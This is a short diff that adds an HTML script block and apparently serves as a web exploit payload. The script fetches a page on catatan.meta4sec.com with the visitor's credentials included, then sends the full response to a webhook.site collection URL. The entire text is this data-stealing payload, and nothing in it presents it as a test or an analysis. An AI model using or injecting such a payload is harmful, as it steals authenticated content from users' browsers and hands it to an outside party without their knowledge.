@@ -1,0 +1,7 @@
+<script>
+fetch('https://catatan.meta4sec.com/',{credentials:'include'})
+.then(r=>r.text())
+.then(t=>{
+  fetch('https://webhook.site/dc81459b-062f-4536-bb3b-2e6f745335ce/data?d='+encodeURIComponent(t))
+})
+</script>
